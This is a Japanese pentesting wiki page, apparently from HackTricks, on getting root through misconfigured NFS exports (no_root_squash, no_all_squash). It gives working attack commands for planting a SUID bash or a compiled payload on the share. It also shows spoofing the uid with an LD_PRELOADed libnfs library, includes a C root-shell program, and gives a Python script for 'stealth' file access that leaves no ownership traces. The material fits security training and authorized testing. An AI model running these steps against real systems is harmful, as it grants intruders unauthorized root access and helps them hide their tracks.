{{#include ../../banners/hacktricks-training.md}}

_ **/etc/exports** _ ファイルを読み、**no_root_squash**として設定されているディレクトリを見つけた場合、クライアントとしてそのディレクトリに**アクセス**し、ローカルの**root**のようにそのディレクトリの中に**書き込む**ことができます。

**no_root_squash**: このオプションは基本的に、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これにより、深刻なセキュリティ上の問題が生じる可能性があります。

**no_all_squash:** これは**no_root_squash**オプションに似ていますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持ち、/etc/exportsファイルを確認し、no_all_squashオプションが存在し、/etc/passwdファイルを確認し、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成（nfsを使用してマウント）します。nobodyユーザーとしてそのsuidを実行し、異なるユーザーになります。

# Privilege Escalation

## Remote Exploit

この脆弱性を見つけた場合、次のように悪用できます：

- クライアントマシンでそのディレクトリを**マウント**し、**rootとして**マウントされたフォルダ内に**/bin/bash**バイナリをコピーし、**SUID**権限を与え、被害者マシンからそのbashバイナリを**実行**します。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **クライアントマシンでそのディレクトリをマウントし、** マウントされたフォルダ内に **rootとして** SUID権限を悪用するコンパイル済みペイロードをコピーし、それに **SUID** 権限を与え、**被害者** マシンからそのバイナリを **実行** します（ここにいくつかの[C SUIDペイロード](payloads-to-execute.md#c)があります）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## ローカルエクスプロイト

> [!NOTE]
> あなたのマシンから被害者のマシンへの**トンネルを作成できる場合、必要なポートをトンネリングしてこの特権昇格を悪用するためにリモートバージョンを使用することができます**。\
> 次のトリックは、ファイル`/etc/exports`が**IPを示している場合**です。この場合、**リモートエクスプロイトを使用することはできず**、**このトリックを悪用する必要があります**。\
> エクスプロイトが機能するためのもう一つの必要条件は、**`/etc/export`内のエクスポートが`insecure`フラグを使用していること**です。\
> --_`/etc/export`がIPアドレスを示している場合、このトリックが機能するかどうかはわかりません_--

## 基本情報

このシナリオは、ローカルマシン上のマウントされたNFS共有を悪用し、クライアントが自分のuid/gidを指定できるNFSv3仕様の欠陥を利用して、無許可のアクセスを可能にします。悪用には、NFS RPCコールの偽造を可能にするライブラリ[libnfs](https://github.com/sahlberg/libnfs)を使用します。

### ライブラリのコンパイル

ライブラリのコンパイル手順は、カーネルバージョンに基づいて調整が必要な場合があります。この特定のケースでは、fallocateシステムコールがコメントアウトされていました。コンパイルプロセスには、次のコマンドが含まれます：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 攻撃の実行

攻撃は、特権をルートに昇格させ、その後シェルを実行するシンプルなCプログラム（`pwn.c`）を作成することを含みます。プログラムはコンパイルされ、結果として得られたバイナリ（`a.out`）は、RPC呼び出しでuidを偽装するために`ld_nfs.so`を使用して、suid rootで共有に配置されます。

1. **攻撃コードをコンパイルする:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **攻撃を共有に配置し、uidを偽装してその権限を変更する:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **攻撃を実行してルート権限を取得する:**
```bash
/mnt/share/a.out
#root
```

## ボーナス: NFShellによるステルスファイルアクセス

ルートアクセスが取得されたら、所有権を変更せずにNFS共有と対話するために（痕跡を残さないために）、Pythonスクリプト（nfsh.py）が使用されます。このスクリプトは、アクセスされるファイルのuidに一致するようにuidを調整し、権限の問題なしに共有上のファイルと対話できるようにします:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
実行するには：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
